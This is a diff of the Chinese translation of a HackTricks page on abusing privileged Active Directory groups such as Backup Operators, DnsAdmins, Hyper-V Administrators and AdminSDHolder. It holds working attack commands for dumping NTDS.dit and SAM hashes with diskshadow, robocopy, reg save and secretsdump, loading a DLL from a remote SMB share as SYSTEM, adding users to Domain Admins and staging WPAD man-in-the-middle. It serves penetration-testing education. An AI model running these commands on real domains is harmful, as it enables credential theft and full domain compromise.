@@ -2,11 +2,11 @@
 
 <details>
 
-<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
 * 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
 * **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
@@ -20,7 +20,7 @@
 * **域管理员**
 * **企业管理员**
 
-在进行安全评估时，如果链式使用多个攻击向量，其他账户成员资格和访问令牌权限也可能有用。
+在进行安全评估时，其他账户成员资格和访问令牌权限也可能在链式攻击多个攻击向量时有用。
 
 ## 账户操作员 <a href="#account-operators" id="account-operators"></a>
 
@@ -31,7 +31,7 @@
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-注意spotless用户的成员资格：
+请注意spotless用户的成员资格：
 
 ![](<../../.gitbook/assets/1 (2) (1) (1).png>)
 
@@ -46,8 +46,8 @@ Get-NetGroupMember -Identity "Account Operators" -Recurse
 ## AdminSDHolder组
 
 **AdminSDHolder** 对象的访问控制列表（ACL）被用作模板，以**复制** **权限** 到 Active Directory 中的**所有“受保护组”**及其成员。受保护的组包括具有特权的组，如域管理员、管理员、企业管理员和架构管理员。\
-默认情况下，该组的ACL被复制到所有的"受保护组"内。这样做是为了避免对这些关键组的故意或意外更改。然而，如果攻击者修改了组**AdminSDHolder**的ACL，例如给予一个普通用户全部权限，这个用户将在一个小时内拥有受保护组内所有组的全部权限。\
-如果有人试图从域管理员组（例如）中删除这个用户，在一小时或更短时间内，该用户将重新回到该组。
+默认情况下，该组的ACL被复制到所有的"受保护组"内。这样做是为了避免对这些关键组的故意或意外更改。然而，如果攻击者修改了组**AdminSDHolder**的ACL，例如给予普通用户完全权限，这个用户将在一个小时内拥有受保护组内所有组的完全权限。\
+如果有人试图从域管理员（例如）中删除这个用户，在一小时或更短时间内，该用户将重新回到该组。
 
 获取组的**成员**：
 ```powershell
@@ -63,7 +63,7 @@ Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 ```
 如果您不想等待一个小时，您可以使用PS脚本立即执行还原操作：[https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
 
-[**更多信息请访问ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+[**在ired.team上获取更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
 
 ## **AD 回收站**
 
@@ -114,7 +114,7 @@ All
 
 为此，您可以使用[**这些脚本**](https://github.com/giuliano108/SeBackupPrivilege)**。**
 
-获取组的**成员**：
+获取该组的**成员**：
 ```
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
@@ -142,7 +142,7 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Ove
 
 您可以滥用此访问权限来**窃取**活动目录数据库**`NTDS.dit`**，以获取域中所有用户和计算机对象的所有**NTLM 哈希值**。
 
-#### 使用 diskshadow.exe 导出 NTDS.dit
+#### 使用 diskshadow.exe 转储 NTDS.dit
 
 使用 [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)，您可以**创建** **`C` 驱动器**的影子副本，并且例如在 `F` 驱动器中。然后，您可以从这个影子副本中窃取 `NTDS.dit` 文件，因为它不会被系统使用：
 ```
@@ -167,7 +167,7 @@ DISKSHADOW> exit
 ```
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-复制文件的另一种方式是使用 [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**：**
+另一种复制文件的方法是使用 [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**：**
 ```
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
@@ -176,7 +176,7 @@ robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-最后你可以**获取所有哈希**来自于**`NTDS.dit`**：
+最后，你可以**获取所有哈希**来自于**`NTDS.dit`**：
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
@@ -208,34 +208,34 @@ echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -item
 ```
 如果成功，它将转储到 `C:\ntds.dit`。
 
-[DEMO 视频与 IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)
+[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)
 
 ## DnsAdmins
 
-一个是 **DNSAdmins** 组成员或对 DNS 服务器对象有 **写权限** 的用户可以在 **DNS 服务器** 上以 **SYSTEM** 权限加载 **任意 DLL**。\
-这非常有趣，因为 **域控制器** 经常被用作 **DNS 服务器**。
+用户如果是 **DNSAdmins** 组的成员或对 DNS 服务器对象有**写权限**，可以在 **DNS 服务器**上以 **SYSTEM** 权限加载**任意 DLL**。\
+这非常有趣，因为 **域控制器**经常被用作 **DNS 服务器**。
 
 如这篇 [**文章**](https://adsecurity.org/?p=4064) 所示，当 DNS 在域控制器上运行时（这是非常常见的），可以执行以下攻击：
 
 * DNS 管理通过 RPC 进行
-* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) 允许我们 **加载** 自定义 **DLL**，而不验证 DLL 的路径。这可以通过命令行中的 `dnscmd` 工具完成
+* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) 允许我们**加载**自定义 **DLL**，而不验证 DLL 的路径。这可以通过命令行中的 `dnscmd` 工具完成
 * 当 **`DnsAdmins`** 组的成员运行下面的 **`dnscmd`** 命令时，`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` 注册表键将被填充
-* 当 **DNS 服务重新启动** 时，此路径中的 **DLL** 将被 **加载**（即域控制器的机器账户可以访问的网络共享）
-* 攻击者可以加载 **自定义 DLL 以获得反向 shell**，甚至可以加载 Mimikatz 之类的工具作为 DLL 来转储凭据。
+* 当 **DNS 服务重启**时，该路径中的 **DLL** 将被**加载**（即，域控制器的机器账户可以访问的网络共享）
+* 攻击者可以加载**自定义 DLL 以获得反向 shell**，甚至可以加载 Mimikatz 之类的工具作为 DLL 来转储凭据。
 
-获取组的 **成员**：
+获取组的**成员**：
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### 执行任意 DLL
 
-如果您有一个用户在 **DNSAdmins 组** 内，您可以让 **DNS 服务器以 SYSTEM 权限加载任意 DLL**（DNS 服务以 `NT AUTHORITY\SYSTEM` 运行）。您可以执行以下操作，使 DNS 服务器加载 **本地或远程**（通过 SMB 共享）的 DLL 文件：
+如果您有一个用户在 **DNSAdmins 组** 内，您可以让 **DNS 服务器以 SYSTEM 权限加载任意 DLL**（DNS 服务以 `NT AUTHORITY\SYSTEM` 运行）。您可以让 DNS 服务器加载一个**本地或远程**（通过 SMB 共享）的 DLL 文件，执行：
 ```
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 ```
 ```markdown
-可以在 [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) 找到一个有效的 DLL 示例。我会将函数 `DnsPluginInitialize` 的代码更改为类似以下内容：
+可以在[https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL)找到一个有效的DLL示例。我会将函数`DnsPluginInitialize`的代码更改为类似以下内容：
 ```
 ```c
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
@@ -255,17 +255,17 @@ msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /dom
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-[**了解更多关于在ired.team中的权限提升**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
+[**了解更多关于此权限提升的信息，请访问ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 
 #### Mimilib.dll
 
-如这篇[**文章**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)中详细介绍的，也可以使用 `Mimikatz` 工具的创建者提供的 [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) 通过**修改** [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) 文件来执行**反向 shell** 单行命令或我们选择的其他命令来获得命令执行。
+如这篇[**文章**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)中详细介绍的，也可以使用 `Mimikatz` 工具的创建者提供的 [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) 通过**修改** [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) 文件来执行**反向 shell**单行命令或我们选择的其他命令，以获得命令执行能力。
 
-### WPAD 记录用于 MitM
+### WPAD 记录用于中间人攻击
 
-另一种**滥用 DnsAdmins** 组权限的方法是创建一个 **WPAD 记录**。该组的成员有权[禁用全局查询阻止安全性](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)，默认情况下会阻止这种攻击。Server 2008 首次引入了在 DNS 服务器上添加到全局查询阻止列表的能力。默认情况下，Web 代理自动发现协议（WPAD）和站点间自动隧道寻址协议（ISATAP）位于全局查询阻止列表上。这些协议非常容易被劫持，任何域用户都可以创建包含这些名称的计算机对象或 DNS 记录。
+另一种**滥用 DnsAdmins** 组权限的方法是创建一个 **WPAD 记录**。该组的成员有权[禁用全局查询阻止安全功能](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)，默认情况下会阻止此攻击。Server 2008 首次引入了在 DNS 服务器上添加到全局查询阻止列表的能力。默认情况下，Web 代理自动发现协议（WPAD）和站点间自动隧道寻址协议（ISATAP）位于全局查询阻止列表上。这些协议非常容易被劫持，任何域用户都可以创建包含这些名称的计算机对象或 DNS 记录。
 
-在**禁用全局查询**阻止列表并创建一个 **WPAD 记录**后，运行默认设置的 WPAD 的**每台机器**都会通过我们的攻击机器代理其**流量**。我们可以使用如 [**Responder**](https://github.com/lgandx/Responder) **或** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) 这样的工具**执行流量欺骗**，并尝试捕获密码哈希并离线破解，或执行 SMBRelay 攻击。
+在**禁用全局查询**阻止列表并创建一个 **WPAD 记录**后，运行 WPAD 的**每台机器**在默认设置下都会通过我们的攻击机器代理其**流量**。我们可以使用如 [**Responder**](https://github.com/lgandx/Responder) **或** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) 这样的工具**执行流量欺骗**，尝试捕获密码哈希并离线破解，或执行 SMBRelay 攻击。
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
@@ -292,18 +292,18 @@ Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -an
 成员被授予**写入域对象的 DACL** 的能力。攻击者可以滥用此权限，**给用户** [**DCSync**](dcsync.md) 权限。\
 如果在 AD 环境中安装了 Microsoft Exchange，通常会发现用户账户甚至计算机作为此组的成员。
 
-这个 [**GitHub 仓库**](https://github.com/gdedrouas/Exchange-AD-Privesc) 解释了一些**技术**，通过滥用该组权限来**提升权限**。
+这个 [**GitHub 仓库**](https://github.com/gdedrouas/Exchange-AD-Privesc) 解释了一些滥用该组权限来**提升权限**的**技术**。
 ```powershell
 #Get members of the group
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V 管理员
 
-[**Hyper-V 管理员**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) 组对所有 [Hyper-V 功能](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) 拥有完全访问权限。如果 **域控制器** 已被 **虚拟化**，那么 **虚拟化管理员** 应被视为 **域管理员**。他们可以轻松地 **创建活动域控制器的克隆** 并 **挂载** 虚拟 **磁盘** 离线以获取 **`NTDS.dit`** 文件，并提取域中所有用户的 NTLM 密码哈希。
+[**Hyper-V 管理员**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) 组对所有 [Hyper-V 功能](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) 拥有完全访问权限。如果 **域控制器** 已被 **虚拟化**，那么 **虚拟化管理员** 应被视为 **域管理员**。他们可以轻松地 **创建域控制器的克隆** 并 **挂载** 虚拟 **磁盘** 离线以获取 **`NTDS.dit`** 文件，并提取域中所有用户的 NTLM 密码散列。
 
-在这篇[博客](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)中也有详细记录，当 **删除** 虚拟机时，`vmms.exe` 会尝试 **恢复对应的** **`.vhdx` 文件的原始文件权限**，并以 `NT AUTHORITY\SYSTEM` 身份这样做，而不是模拟用户。我们可以 **删除 `.vhdx`** 文件并 **创建** 一个指向 **受保护的 SYSTEM 文件的本地硬链接**，你将被授予完全权限。
+在这篇 [博客](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) 中也有详细记录，当 **删除** 虚拟机时，`vmms.exe` 会尝试 **恢复对应的** **`.vhdx` 文件** 的原始文件权限，并以 `NT AUTHORITY\SYSTEM` 身份执行，不会模拟用户。我们可以 **删除 `.vhdx`** 文件并 **创建** 一个指向 **受保护的 SYSTEM 文件** 的本机 **硬链接**，你将被赋予该文件的全部权限。
 
-如果操作系统易受 [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) 或 [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) 的影响，我们可以利用这一点获得 SYSTEM 权限。否则，我们可以尝试 **利用服务器上安装了以 SYSTEM 上下文运行的服务的应用程序**，该服务可由非特权用户启动。
+如果操作系统易受 [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) 或 [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) 的影响，我们可以利用这一点获得 SYSTEM 权限。否则，我们可以尝试 **利用服务器上安装了以 SYSTEM 身份运行的服务的应用程序**，该服务可由非特权用户启动。
 
 ### **利用示例**
 
@@ -313,7 +313,7 @@ C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 ```
 #### **获取文件的所有权**
 
-运行PowerShell脚本后，我们应该**完全控制这个文件并且可以取得其所有权**。
+运行PowerShell脚本后，我们应该**完全控制这个文件并且可以取得它的所有权**。
 ```bash
 C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 ```
@@ -324,7 +324,7 @@ C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanc
 C:\htb> sc.exe start MozillaMaintenance
 ```
 {% hint style="info" %}
-此攻击向量已通过 2020 年 3 月的 Windows 安全更新得到缓解，该更新改变了与硬链接相关的行为。
+此攻击向量已被 2020 年 3 月的 Windows 安全更新所缓解，该更新改变了与硬链接相关的行为。
 {% endhint %}
 
 ## 组织管理
@@ -338,18 +338,18 @@ C:\htb> sc.exe start MozillaMaintenance
 该组成员被授予：
 
 * [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
-* **在域控制器上本地登录** 并将其关闭
+* **在域控制器上本地登录** 并关闭它
 * 权限去**管理**、创建、共享和删除**连接到域控制器的打印机**
 
 {% hint style="warning" %}
-如果命令 `whoami /priv` 在非提升的上下文中没有显示 **`SeLoadDriverPrivilege`**，你需要绕过 UAC。
+如果命令 `whoami /priv` 在非提升权限的上下文中没有显示 **`SeLoadDriverPrivilege`**，你需要绕过 UAC。
 {% endhint %}
 
 获取该组的**成员**：
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-查看此页面了解如何滥用SeLoadDriverPrivilege进行权限提升：
+查看本页如何滥用SeLoadDriverPrivilege进行权限提升：
 
 {% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
 [abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
@@ -436,10 +436,10 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 支持HackTricks的其他方式：
 
-* 如果您想在**HackTricks**中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
 * 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
 * **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
